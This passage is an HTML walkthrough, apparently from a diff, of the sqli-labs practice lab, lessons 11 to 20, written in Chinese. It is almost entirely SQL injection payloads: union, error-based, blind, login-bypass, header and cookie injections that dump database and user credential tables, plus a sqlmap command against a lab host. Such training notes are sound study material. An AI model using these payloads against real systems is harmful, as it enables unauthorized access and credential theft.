+<pre><code class='language-shell' lang='shell'>sqlmap -u &quot;http://daishen.ltd:1112/Less-11/&quot; --data=&quot;uname=admin&amp;passwd=2333&amp;submit=Submit&quot; -p &quot;uname&quot; --dbms=MySQL --random-agent --flush-session --technique=T -v 3
+</code></pre>
+<h1 id='less-12'><strong>Less-12</strong></h1>
+<p> <strong>POST - Error Based - Double quotes- String-with twist (基于错误的双引号POST型字符型变形的注入)</strong></p>
+<p>&nbsp;</p>
+<h3 id='联合查询注入-2'>联合查询注入</h3>
+<blockquote><p>POST 数据里面不能有 <code>+</code>，这里得手动转换为空格</p>
+</blockquote>
+<pre><code class='language-payload' lang='payload'>uname=admin&amp;passwd=1&quot;)union select 1,(SELECT GROUP_CONCAT(username,password) FROM users)#&amp;submit=Submit
+</code></pre>
+<p>爆出位置</p>
+<pre><code>uname=0&quot;) union select 1,2 --+&amp;passwd=admin&amp;submit=Submit
+</code></pre>
+<p>暴库payload</p>
+<pre><code>uname=0&quot;) union select 1,database() --+&amp;passwd=admin&amp;submit=Submit
+</code></pre>
+<p>暴表payload</p>
+<pre><code>uname=admin&quot;) and 1=2 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() --+&amp;passwd=admin&amp;submit=Submit
+</code></pre>
+<p>暴字段</p>
+<pre><code>uname=admin&quot;) and 1=2 union select 1,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; --+&amp;passwd=admin&amp;submit=Submit
+</code></pre>
+<p>暴内容</p>
+<pre><code>uname=admin&quot;) and 1=2 union select 1,group_concat(username,0x3a,password,0x23) from users --+&amp;passwd=admin&amp;submit=Submit
+</code></pre>
+<h3 id='extractvalue报错注入-2'>extractvalue报错注入</h3>
+<p>爆库payload</p>
+<pre><code>uname=admin&quot;) and extractvalue(1,concat(0x7e,(select database()))) --+&amp;passwd=admin&amp;submit=Submit
+</code></pre>
+<p>爆表payload</p>
+<pre><code>uname=admin&quot;) and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) --+&amp;passwd=admin&amp;submit=Submit
+</code></pre>
+<p>爆列名payload</p>
+<pre><code>uname=admin&quot;) and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;))) --+&amp;passwd=admin&amp;submit=Submit
+</code></pre>
+<p>爆值payload</p>
+<pre><code>uname=admin&quot;) and extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users)))--+&amp;passwd=admin&amp;submit=Submit
+</code></pre>
+<h3 id='万能密码-2'>万能密码</h3>
+<pre><code># 注释掉 passwd 来登录
+uname=admin&quot;)--+&amp;passwd=&amp;submit=Submit
+uname=admin&quot;)#&amp;passwd=&amp;submit=Submit
+
+# 注释后面语句 并 添加一个永真条件
+uname=admin&amp;passwd=1&quot;) or 1--+&amp;submit=Submit
+uname=admin&amp;passwd=1&quot;)||1--+&amp;submit=Submit
+uname=admin&amp;passwd=1&quot;) or 1#&amp;submit=Submit
+uname=admin&amp;passwd=1&quot;)||1#&amp;submit=Submit
+</code></pre>
+<h1 id='less-13'><strong>Less-13</strong> </h1>
+<p><strong>POST - Double Injection - Single quotes- String -twist (POST单引号变形双注入)</strong></p>
+<p>&nbsp;</p>
+<h3 id='extractvalue报错注入-3'>extractvalue报错注入</h3>
+<p>爆库payload</p>
+<pre><code>uname=admin&#39;) and extractvalue(1,concat(0x7e,(select database()))) --+&amp;passwd=admin&amp;submit=Submit
+</code></pre>
+<p>爆表payload</p>
+<pre><code>uname=admin&#39;) and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) --+&amp;passwd=admin&amp;submit=Submit
+</code></pre>
+<p>爆列名payload</p>
+<pre><code>uname=admin&#39;) and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;))) --+&amp;passwd=admin&amp;submit=Submit
+</code></pre>
+<p>爆值payload</p>
+<pre><code>uname=admin&#39;) and extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users)))--+&amp;passwd=admin&amp;submit=Submit
+</code></pre>
+<h1 id='less-14'><strong>Less-14</strong> </h1>
+<p><strong>POST - Double Injection - Single quotes- String -twist (POST单引号变形双注入)</strong></p>
+<p>&nbsp;</p>
+<h3 id='extractvalue报错注入-4'>extractvalue报错注入</h3>
+<p>爆库payload</p>
+<pre><code>uname=admin&quot; and extractvalue(1,concat(0x7e,(select database()))) --+&amp;passwd=admin&amp;submit=Submit
+</code></pre>
+<p>爆表payload</p>
+<pre><code>uname=admin&quot; and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) --+&amp;passwd=admin&amp;submit=Submit
+</code></pre>
+<p>爆列名payload</p>
+<pre><code>uname=admin&quot; and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;))) --+&amp;passwd=admin&amp;submit=Submit
+</code></pre>
+<p>爆值payload</p>
+<pre><code>uname=admin&quot; and extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users)))--+&amp;passwd=admin&amp;submit=Submit
+</code></pre>
+<h1 id='less-15'><strong>less-15 </strong></h1>
+<p><strong>POST - Blind- Boolian/time Based - Single quotes (基于bool型/时间延迟单引号POST型盲注)</strong></p>
+<p>&nbsp;</p>
+<h3 id='方法一时间延迟手工注入-1'><strong>方法一，时间延迟手工注入</strong></h3>
+<p>时间延迟测试payload</p>
+<pre><code>uname=admin&#39; and sleep(5) --+&amp;passwd=admin&amp;submit=Submit
+</code></pre>
+<p>暴库长度payload</p>
+<pre><code>uname=admin&#39; and if(length(database())=8,sleep(3),1) --+&amp;passwd=admin&amp;submit=Submit
+</code></pre>
+<p>暴库payload</p>
+<pre><code>uname=admin&#39; and if(left(database(),2)=&#39;se&#39;,sleep(5),1) --+&amp;passwd=admin&amp;submit=Submit
+
+uname=admin&#39; and if(left(database(),8)=&#39;security&#39;,sleep(5),1) --+&amp;passwd=admin&amp;submit=Submit
+</code></pre>
+<p>爆表payload</p>
+<pre><code>uname=admin&#39; and if(left((select table_name from information_schema.tables where table_schema=database() limit 3,1),1)=&#39;u&#39;,sleep(5),1) --+&amp;passwd=admin&amp;submit=Submit
+
+uname=admin&#39; and if(left((select table_name from information_schema.tables where table_schema=database() limit 3,1),5)=&#39;users&#39;,sleep(5),1) --+&amp;passwd=admin&amp;submit=Submit
+</code></pre>
+<p>暴出列名</p>
+<pre><code>uname=admin&#39; and if(left((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 0,1),2)=&#39;id&#39;,sleep(3),1) --+&amp;passwd=admin&amp;submit=Submit
+</code></pre>
+<p>暴值payload</p>
+<pre><code>uname=admin&#39; and if(left((select username from users limit 0,1),1)=&#39;D&#39;,sleep(3),1) --+&amp;passwd=admin&amp;submit=Submit
+
+
+me=admin&#39; and if(left((select username from users limit 0,1),4)=&#39;Dumb&#39;,sleep(3),1) --+&amp;passwd=admin&amp;submit=Submit
+</code></pre>
+<h3 id='方法二布尔型手工注入-3'><strong>方法二，布尔型手工注入</strong></h3>
+<p>判断数据库长度</p>
+<pre><code>uname=admin&#39; and length(database())=8 --+&amp;passwd=admin&amp;submit=Submit
+</code></pre>
+<p>暴力破击数据库名</p>
+<pre><code>uname=admin&#39; and left((select database()),1)=&#39;s&#39; --+&amp;passwd=admin&amp;submit=Submit
+
+uname=admin&#39; and left((select database()),8)=&#39;security&#39; --+&amp;passwd=admin&amp;submit=Submit
+</code></pre>
+<p>暴力破解表名</p>
+<pre><code>uname=admin&#39; and left((select table_name from information_schema.tables where table_schema =database() limit 3,1),1)=&#39;u&#39; --+&amp;passwd=admin&amp;submit=Submit
+
+uname=admin&#39; and left((select table_name from information_schema.tables where table_schema =database() limit 3,1),5)=&#39;users&#39; --+&amp;passwd=admin&amp;submit=Submit
+</code></pre>
+<p>暴力破解列名</p>
+<pre><code>uname=admin&#39; and left((select column_name from information_schema.columns where table_name =&#39;users&#39; limit 0,1),2)=&#39;id&#39; --+&amp;passwd=admin&amp;submit=Submit
+</code></pre>
+<p>暴力破解字段</p>
+<pre><code>uname=admin&#39; and left((select username from users limit 0,1),1)=&#39;D&#39; --+&amp;passwd=admin&amp;submit=Submit
+</code></pre>
+<h1 id='less-16'><strong>Less-16</strong> </h1>
+<p><strong>POST - Blind- Boolian/Time Based - Double quotes (基于bool型/时间延迟的双引号POST型盲注)</strong></p>
+<p>&nbsp;</p>
+<h3 id='方法一时间延迟手工注入-2'><strong>方法一，时间延迟手工注入</strong></h3>
+<p>时间延迟测试payload</p>
+<pre><code>uname=admin&quot;) and sleep(5) --+&amp;passwd=admin&amp;submit=Submit
+</code></pre>
+<p>暴库长度payload</p>
+<pre><code>uname=admin&quot;) and if(length(database())=8,sleep(3),1) --+&amp;passwd=admin&amp;submit=Submit
+</code></pre>
+<p>暴库payload</p>
+<pre><code>uname=admin&quot;) and if(left(database(),2)=&#39;se&#39;,sleep(5),1) --+&amp;passwd=admin&amp;submit=Submit
+
+uname=admin&quot;) and if(left(database(),8)=&#39;security&#39;,sleep(5),1) --+&amp;passwd=admin&amp;submit=Submit
+</code></pre>
+<p>爆表payload</p>
+<pre><code>uname=admin&quot;) and if(left((select table_name from information_schema.tables where table_schema=database() limit 3,1),1)=&#39;u&#39;,sleep(5),1) --+&amp;passwd=admin&amp;submit=Submit
+
+uname=admin&quot;) and if(left((select table_name from information_schema.tables where table_schema=database() limit 3,1),5)=&#39;users&#39;,sleep(5),1) --+&amp;passwd=admin&amp;submit=Submit
+</code></pre>
+<p>暴出列名</p>
+<pre><code>uname=admin&quot;) and if(left((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 0,1),2)=&#39;id&#39;,sleep(3),1) --+&amp;passwd=admin&amp;submit=Submit
+</code></pre>
+<p>暴值payload</p>
+<pre><code>uname=admin&quot;) and if(left((select username from users limit 0,1),1)=&#39;D&#39;,sleep(3),1) --+&amp;passwd=admin&amp;submit=Submit
+
+
+uname=admin&quot;) and if(left((select username from users limit 0,1),4)=&#39;Dumb&#39;,sleep(3),1) --+&amp;passwd=admin&amp;submit=Submit
+</code></pre>
+<h3 id='方法二布尔型手工注入-4'><strong>方法二，布尔型手工注入</strong></h3>
+<p>判断数据库长度</p>
+<pre><code>uname=admin&quot;) and length(database())=8 --+&amp;passwd=admin&amp;submit=Submit
+</code></pre>
+<p>暴力破击数据库名</p>
+<pre><code>uname=admin&quot;) and left((select database()),1)=&#39;s&#39; --+&amp;passwd=admin&amp;submit=Submit
+
+uname=admin&quot;) and left((select database()),8)=&#39;security&#39; --+&amp;passwd=admin&amp;submit=Submit
+</code></pre>
+<p>暴力破解表名</p>
+<pre><code>uname=admin&quot;) and left((select table_name from information_schema.tables where table_schema =database() limit 3,1),1)=&#39;u&#39; --+&amp;passwd=admin&amp;submit=Submit
+
+uname=admin&quot;) and left((select table_name from information_schema.tables where table_schema =database() limit 3,1),5)=&#39;users&#39; --+&amp;passwd=admin&amp;submit=Submit
+</code></pre>
+<p>暴力破解列名</p>
+<pre><code>uname=admin&quot;) and left((select column_name from information_schema.columns where table_name =&#39;users&#39; limit 0,1),2)=&#39;id&#39; --+&amp;passwd=admin&amp;submit=Submit
+</code></pre>
+<p>暴力破解字段</p>
+<pre><code>uname=admin&quot;) and left((select username from users limit 0,1),1)=&#39;D&#39; --+&amp;passwd=admin&amp;submit=Submit
+</code></pre>
+<h3 id='方法三歪门邪道'><strong>方法三，歪门邪道：</strong></h3>
+<p>万能账号绕过密码验证：</p>
+<pre><code>admin&quot;)#
+</code></pre>
+<p>注入结束。</p>
+<h1 id='less-17'><strong>Less-17 </strong></h1>
+<p><strong>POST - Update Query- Error Based - String (基于错误的更新查询POST注入)</strong></p>
+<p>&nbsp;</p>
+<p>使用updatexml（），它和extractvaule（）是亲兄弟</p>
+<p>爆库payload</p>
+<pre><code>uname=admin&amp;passwd=admin&#39; and updatexml(1,concat(0x7e,database(),0x7e),1) --+&amp;submit=Submit
+</code></pre>
+<p>爆表名payload</p>
+<pre><code>uname=admin&amp;passwd=admin&#39; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) --+&amp;submit=Submit
+</code></pre>
+<p>爆列名payload</p>
+<pre><code>uname=admin&amp;passwd=admin&#39; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;),0x7e),1) --+&amp;submit=Submit
+</code></pre>
+<p>爆值payload</p>
+<pre><code>uname=admin&amp;passwd=11&#39;  and  updatexml(1,concat(0x7e,(select password from (select password from users limit 7,1) test ),0x7e),1) --+&amp;submit=Submit
+</code></pre>
+<h1 id='less-18'><strong>Less-18</strong> </h1>
+<p><strong>POST - Header Injection - Uagent field - Error based (基于错误的用户代理，头部POST注入)</strong></p>
+<p>&nbsp;</p>
+<p>爆库payload</p>
+<pre><code>User-Agent: &#39; and extractvalue(1,concat(0x7e,database())) and &#39;
+</code></pre>
+<p>暴表payload</p>
+<pre><code>User-Agent: &#39; and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) and &#39;
+</code></pre>
+<p>暴字段payload</p>
+<pre><code>User-Agent: &#39; and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;))) and &#39;
+</code></pre>
+<p>暴值payload</p>
+<pre><code>User-Agent: &#39; and extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users))) and &#39;
+</code></pre>
+<p>未显示完全</p>
+<pre><code>User-Agent: &#39; and extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users where username not in (&#39;Dumb&#39;,&#39;Angelina&#39;)))) and &#39;
+</code></pre>
+<h1 id='less-19'><strong>Less-19</strong> </h1>
+<p><strong>POST - Header Injection - Referer field - Error based (基于头部的Referer POST报错注入)</strong></p>
+<p>&nbsp;</p>
+<p>暴库payload</p>
+<pre><code>Referer: &#39; and extractvalue(1,concat(0x7e,database())) and &#39;
+</code></pre>
+<p>暴表</p>
+<pre><code>Referer: &#39; and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) and &#39;
+</code></pre>
+<p>暴字段</p>
+<pre><code>Referer: &#39; and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;))) and &#39;
+</code></pre>
+<p>暴值</p>
+<pre><code>Referer: &#39; and extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users))) and &#39;
+</code></pre>
+<p>显示未完全</p>
+<pre><code>Referer: &#39; and extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users where username not in (&#39;Dumb&#39;,&#39;Angelina&#39;)))) and &#39;
+</code></pre>
+<h1 id='less-20'><strong>Less-20</strong> </h1>
+<p><strong>POST - Cookie injections - Uagent field - Error based (基于错误的cookie头部POST注入)</strong></p>
+<p>&nbsp;</p>
+<p>看到<strong>cookie：uname=admin</strong> 没毛病就是cookie注入了</p>
+<p>抓有cookie的包</p>
+<p>加单引号</p>
+<pre><code>Cookie: uname=admin&#39;
+</code></pre>
+<p>爆出语法错误，看得出来就是单引号型。</p>
+<p>暴字段数</p>
+<pre><code>Cookie: uname=admin&#39; order by 3 --+    //正常
+
+Cookie: uname=admin&#39; order by 4 --+    //报错    判断字段数为3
+</code></pre>
+<p>暴字段位置</p>
+<pre><code>Cookie: uname=-admin&#39;  union select 1,2,3 --+
+</code></pre>
+<p>暴库，版本</p>
+<pre><code>Cookie: uname=-admin&#39;  union select version(),database(),3 --+
+</code></pre>
+<p>暴表名</p>
+<pre><code>Cookie: uname=-admin&#39;  union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+
+</code></pre>
+<p>暴字段</p>
+<pre><code>Cookie: uname=-admin&#39;  union select 1,2,group_concat(column_name) from information_schema.columns where table_name =&#39;users&#39; --+
+</code></pre>
+<p>暴内容</p>
+<pre><code>Cookie: uname=-admin&#39;  union select 1,2,group_concat(username,password) from users --+
+</code></pre>
+<p>&nbsp;</p>
+</body>
+</html>
